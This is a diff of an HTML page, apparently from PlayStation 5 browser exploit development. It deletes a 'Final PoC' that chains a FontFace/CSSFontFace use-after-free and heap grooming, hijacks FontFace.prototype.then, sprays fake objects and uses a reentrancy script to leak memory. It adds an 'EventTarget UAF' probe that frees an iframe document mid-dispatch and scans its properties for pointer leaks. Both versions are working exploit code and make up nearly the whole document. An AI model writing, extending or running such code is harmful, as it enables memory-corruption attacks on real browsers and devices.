@@ -1,278 +1,110 @@
 <!DOCTYPE html>
-<!-- PS5 FW 13.40 – Final PoC: CSSFontFace confusion + insertion-path reentrancy fake FontFace -->
 <html>
-<head>
-<meta charset="utf-8">
-<title>PS5 Insertion‑Path FakeFont Exploit</title>
-<style id="s">
-@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
-@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
-</style>
-</head>
+<head><meta charset="utf-8"><title>EventTarget Info Leak Probe</title></head>
 <body>
-<p style="color:white;background:black;padding:10px;font-family:monospace;">
-  <button id="trigger" style="font-size:20px;padding:10px;">
-    ▶ Trigger Exploit
-  </button>
-</p>
-<div id="out" style="font-family:monospace;white-space:pre-wrap;padding:10px;color:#0f0;background:#000;min-height:80vh;"></div>
+<p><button onclick="go()">Click to run leak probe</button></p>
+<div id="out" style="font-family:monospace;white-space:pre;color:#0f0;background:#000;"></div>
 <script>
 'use strict';
 
-// ========== LOGGING ==========
-const O = document.getElementById('out');
+// ---------- Logging ----------
+const out = document.getElementById('out');
 function log(m, c) {
     console.log(m);
     const s = document.createElement('span');
     if (c) s.style.color = c;
     s.textContent = m + '\n';
-    O.appendChild(s);
-    O.scrollTop = O.scrollHeight;
+    out.appendChild(s);
 }
-function ok(m)  { log('  ✅ ' + m, '#0f0'); }
-function fl(m)  { log('  ✘ ' + m, '#f00'); }
-function star(m){ log('  ★ ' + m + ' ★', '#ff0'); }
 
-// ========== BINARY FONT HELPER ==========
-const FB = 'd09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt';
-const FBb = (() => { const s = atob(FB), b = new Uint8Array(s.length); for (let i=0;i<s.length;i++) b[i]=s.charCodeAt(i); return b; })();
-function mkBuf() { return new Uint8Array(FBb).buffer; }
-function forceStyle() { void document.body.offsetTop; }
+// ---------- Suspicious value detector ----------
+function isSuspicious(val) {
+    const s = String(val);
+    // Hex pointer pattern
+    if (/\b0x[0-9a-f]{6,16}\b/i.test(s)) return true;
+    // Long decimal numbers
+    if (/^\d{10,}$/.test(s)) return true;
+    // High entropy garbage strings
+    if (s.length > 50 && s.replace(/[A-Za-z0-9]/g,'').length > 10) return true;
+    return false;
+}
 
-// ========== GLOBALS ==========
-const sh = document.getElementById('s').sheet;
-const keep = [], holes = [];
-let trigger = null, uafOk = false;
-let aFamilyStr = ''; // will hold the confused family string for the script element
+function go() {
+    log('=== EventTarget UAF Info Leak Probe ===', '#fff');
 
-// ========== PHASE 1: HEAP GROOMING + UAF (same as v46) ==========
-function setupConfusion() {
-    star('Phase 1: Grooming & UAF');
-    for (let i = 0; i < 4096; i++) {
+    // Step 1: Create iframe and event setup
+    const f = document.body.appendChild(document.createElement('iframe'));
+    const a = document.createElement('div');
+    const b = a.appendChild(document.createElement('div'));
+
+    // Listener 1: remove iframe + throw string spray
+    a.addEventListener('x', function() {
+        log('Listener 1: removing iframe & spraying...');
+        document.adoptNode(a);
+        f.remove();   // Document may become unreachable
+
+        // Throw with a 32 MB string spray of 'B' characters
+        throw {
+            line: 1, column: 1,
+            sourceURL: 'B'.repeat(1024 * 1024 * 32)
+        };
+    });
+
+    // Listener 2: no-op
+    a.addEventListener('x', () => {});
+
+    // Listener 3: attempt to read freed Document WITHOUT saving a reference
+    b.addEventListener('x', function() {
+        log('Listener 3: accessing f.contentDocument...');
         try {
-            const f = new FontFace('h_' + i, mkBuf(), {
-                unicodeRange: 'U+E1' + (i % 16).toString(16),
-                style: i % 2 ? 'italic' : 'normal',
-                weight: String(100 + (i % 9) * 100)
-            });
-            document.fonts.add(f);
-            holes.push(f);
-        } catch(e) {}
-    }
-    forceStyle();
-    for (let i = 1; i < holes.length; i += 2) try { document.fonts.delete(holes[i]); } catch(e) {}
-    forceStyle();
-    ok('Holes: ' + holes.length);
-
-    trigger = new FontFace('trigger', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(trigger);
-    void trigger.loaded;
-    for (let i = 0; i < 48; i++) try {
-        sh.insertRule('@font-face{font-family:pad' + i + ';src:url(np' + i + '.woff);unicode-range:U+E000}', sh.cssRules.length);
-    } catch(e) {}
-    forceStyle();
-    const fst = document.createElement('style'); document.head.appendChild(fst);
-    const fsh = fst.sheet;
-    for (let i = 0; i < 768; i++) try {
-        fsh.insertRule('@font-face{font-family:fl' + i + ';src:url(nf' + i + '.woff);unicode-range:U+E000}', fsh.cssRules.length);
-    } catch(e) {}
-    forceStyle();
-
-    // UAF trigger override
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get: function() {
-            if (this === trigger && !uafOk) {
-                uafOk = true;
-                try {
-                    const ck = new FontFace('ck', 'local(Helvetica)', { unicodeRange: 'U+E124' });
-                    document.fonts.add(ck); keep.push(ck);
-                    sh.deleteRule(1); // free CSSFontFace for "x"
-                    forceStyle();
-                    while (fsh.cssRules.length) try { fsh.deleteRule(0); } catch(e) {}
-                    forceStyle();
-                    for (let i = 0; i < holes.length; i += 4) try { document.fonts.delete(holes[i]); } catch(e) {}
-                    forceStyle();
-                } catch(e) {}
-                // Memory pressure
-                for (let i = 0; i < 4; i++) { const t = []; for (let j = 0; j < 128; j++) t.push(new ArrayBuffer(8192)); }
-                // Spray 2048 CSSRules to reclaim the slot
-                for (let i = 0; i < 2048; i++) {
-                    try { sh.insertRule('@font-face{font-family:A_' + i + ';src:local(Courier);font-weight:' + (100 + (i % 9) * 100) + ';font-style:' + (i % 2 ? 'italic' : 'normal') + ';unicode-range:U+0042}', sh.cssRules.length); } catch(e) {}
-                }
-                forceStyle();
-                try {
-                    const d = document.createElement('div'); d.textContent = 'AB';
-                    d.style.cssText = 'position:absolute;left:-9999px;font:64px trigger;';
-                    document.body.appendChild(d); void d.offsetWidth;
-                } catch(e) {}
+            // Try to get document without locking a JS ref
+            const doc = f.contentDocument;
+            if (!doc) {
+                log('  f.contentDocument is null', '#f00');
+                return;
             }
-            return undefined;
+            log('  Document still reachable, reading all properties...');
+
+            // List of common Document properties
+            const props = [
+                'URL', 'documentURI', 'title', 'characterSet', 'contentType',
+                'readyState', 'designMode', 'compatMode', 'hidden', 'visibilityState',
+                'cookie', 'lastModified', 'location', 'referrer', 'activeElement',
+                'body', 'head', 'images', 'links', 'forms', 'scripts',
+                'styleSheets', 'all', 'children', 'childElementCount', 'firstElementChild',
+                'lastElementChild', 'rootElement', 'scrollingElement', 'documentElement',
+                'domain', 'inputEncoding', 'xmlEncoding', 'xmlVersion', 'xmlStandalone',
+                'anchors', 'applets', 'embeds', 'plugins', 'baseURI', 'origin',
+                'defaultView', 'ownerDocument', 'parentElement'
+            ];
+            for (const p of props) {
+                try {
+                    const v = doc[p];
+                    const str = String(v);
+                    if (isSuspicious(str)) {
+                        log(`  ★ LEAK? ${p} = ${str}`, '#ff0');
+                    } else {
+                        log(`    ${p} = ${str}`);
+                    }
+                } catch(e) {
+                    log(`    ${p} = ERROR: ${e.message}`);
+                }
+            }
+            log('  Property scan done.');
+        } catch(e) {
+            log('  Exception in listener 3: ' + e.message, '#f00');
         }
     });
-    ok('UAF override installed');
-}
 
-// ========== PHASE 2: IDENTIFY CONFUSED FONTFACE ==========
-function identifyConfused() {
-    return document.fonts.load('1em trigger, x', 'AB').then(function(faces) {
-        let aFamily = null, aFace = null;
-        for (const f of faces) {
-            if (f.family && f.family.startsWith('A_')) {
-                aFamily = f.family;
-                aFace = f;
-            }
-        }
-        if (!aFamily) {
-            fl('No A_* family found – UAF may have failed.');
-            return;
-        }
-        star('Confusion: ' + aFamily);
-        aFamilyStr = aFamily; // store for later use in script element
-        keep.push(faces);
-
-        // Quick liveness test
-        const aIndex = findRuleIndex(aFamily);
-        if (aIndex === -1) { fl('Cannot find matching CSSRule'); return; }
-        const aRule = sh.cssRules[aIndex];
-        aRule.style.setProperty('font-weight', '700');
-        forceStyle();
-        if (String(aFace.weight) !== '700') { fl('Confusion died after first write'); return; }
-        ok('Confusion ALIVE');
-
-        // ========== PHASE 3: FREE THE JS WRAPPER ==========
-        star('Phase 3: Freeing JS wrapper');
-        // Remove the FontFace from document.fonts to drop internal references
-        try { document.fonts.delete(aFace); } catch(e) {}
-        // Release all JS references
-        keep.length = 0; // clear the faces array
-        aFace = null;
-        // Force garbage collection (multiple attempts)
-        try { if (typeof GCController !== 'undefined') GCController.collect(); } catch(e) {}
-        // Allocate some temporary objects to trigger GC heuristics
-        for (let i = 0; i < 100; i++) {
-            const tmp = new ArrayBuffer(8192);
-            tmp; // prevent optimization
-        }
-        try { if (typeof GCController !== 'undefined') GCController.collect(); } catch(e) {}
-        ok('JS references dropped, GC attempted');
-
-        // ========== PHASE 4: SPRAY FAKE FONTFACE OBJECTS ==========
-        star('Phase 4: Spraying fake FontFace objects');
-        const possibleSizes = [32, 48, 64, 80, 96, 128, 144, 160, 176, 192, 208, 224, 240, 256];
-        const fakeObjects = [];
-        const marker = 0x0badc0de;
-        for (const sz of possibleSizes) {
-            for (let i = 0; i < 200; i++) {
-                const buf = new ArrayBuffer(sz);
-                const dv = new DataView(buf);
-                // Fill with a pattern so we can recognize it
-                for (let j = 0; j < sz; j += 4) dv.setUint32(j, marker, true);
-                // Set the first 8 bytes to a fake vtable-like marker (will show as hex)
-                dv.setUint32(0, marker, true);
-                dv.setUint32(4, 0xdeadbeef, true);
-                fakeObjects.push(buf);
-            }
-        }
-        ok('Sprayed ' + fakeObjects.length + ' fake objects across sizes ' + possibleSizes.join(','));
-
-        // ========== PHASE 5: INSERTION-PATH TRIGGER ==========
-        star('Phase 5: Insertion-path reentrancy');
-        // Create a <script> that will execute synchronously during appendChild,
-        // inside childrenChanged (after ScriptDisallowedScope has ended).
-        // Inside that script, we:
-        //   1. Force a layout with a div set to the confused family.
-        //      This triggers font loading, which calls CSSFontFace::wrapper().
-        //      Since m_wrapper is null, a new FontFace is allocated – possibly from our spray.
-        //   2. Try to get the new FontFace from document.fonts and read its .family.
-        //      If the spray worked, .family will be corrupted (contain our marker).
-        const scriptEl = document.createElement('script');
-        scriptEl.textContent = `
-            (function() {
-                // This runs synchronously inside ContainerNode::childrenChanged.
-                // aFamilyStr is a global set by the outer code.
-                if (typeof aFamilyStr === 'undefined' || aFamilyStr === '') return;
-
-                // Create a test div with the confused font
-                var testDiv = document.createElement('div');
-                testDiv.style.fontFamily = aFamilyStr;
-                testDiv.textContent = 'TEST';
-                document.body.appendChild(testDiv);
-
-                // Force layout – this triggers font loading, which calls CSSFontFace::wrapper()
-                void testDiv.offsetWidth;
-
-                // Try to retrieve the newly created FontFace
-                var leaked = null;
-                try {
-                    // Iterate over document.fonts to find one whose .family is corrupted
-                    var allFonts = document.fonts;
-                    for (var i = 0; i < allFonts.size; i++) {
-                        var f = allFonts[i]; // not standard, but try
-                        // Actually, FontFaceSet is iterable
-                    }
-                    // Use for..of
-                    for (var f of allFonts) {
-                        var fam = f.family;
-                        // If the spray landed, fam might be junk
-                        if (fam && (fam.indexOf('0x') !== -1 || fam.length > 50 || fam.indexOf('badc0de') !== -1)) {
-                            leaked = fam;
-                            break;
-                        }
-                    }
-                } catch(e) {}
-
-                // Also try to read directly from the new FontFace if we can get it via load()?
-                // But load() is async, so we start it and then read later? No.
-
-                // Instead, force another layout and see if the font name appears anywhere odd.
-                // Write result to a global variable for the outer code to check.
-                window.__leakedFontFamily = leaked || 'none';
-            })();
-        `;
-        document.body.appendChild(scriptEl); // THIS TRIGGERS THE SYNCHRONOUS SCRIPT
-        ok('Insertion script executed');
-
-        // Check if we got a leak
-        if (window.__leakedFontFamily && window.__leakedFontFamily !== 'none') {
-            star('POSSIBLE LEAK: ' + window.__leakedFontFamily);
-        } else {
-            fl('No leak detected from insertion-path script.');
-            // Fallback: try async load to see if wrapper() created a broken FontFace
-            star('Fallback: async load attempt');
-            document.fonts.load('1em ' + aFamilyStr, 'B').then(function(fallFaces) {
-                for (const f of fallFaces) {
-                    const fam = f.family;
-                    log('Async load family: ' + fam);
-                    if (fam && (fam.indexOf('0x') !== -1 || fam.length > 50 || fam.indexOf('badc0de') !== -1)) {
-                        star('ASYNC LEAK: ' + fam);
-                    }
-                }
-            });
-        }
-
-        star('EXPLOIT CHAIN COMPLETE');
-    });
-}
-
-// Helper: find CSS rule for a given family
-function findRuleIndex(family) {
-    for (let i = 0; i < sh.cssRules.length; i++) {
-        try {
-            const r = sh.cssRules[i];
-            if (r.type === 5 && r.style.getPropertyValue('font-family').indexOf(family) !== -1) {
-                return i;
-            }
-        } catch(e) {}
+    log('Dispatching event...');
+    // The dispatch will throw, but the third listener should still execute.
+    try {
+        b.dispatchEvent(new Event('x', { bubbles: true }));
+    } catch(e) {
+        log('Main: caught throw (expected)');
     }
-    return -1;
+    log('=== Probe finished ===', '#fff');
 }
-
-// ========== ENTRY POINT ==========
-document.getElementById('trigger').addEventListener('click', function() {
-    setupConfusion();
-    identifyConfused().catch(function(e) { fl('Error: ' + e.message); });
-});
 </script>
 </body>
 </html>
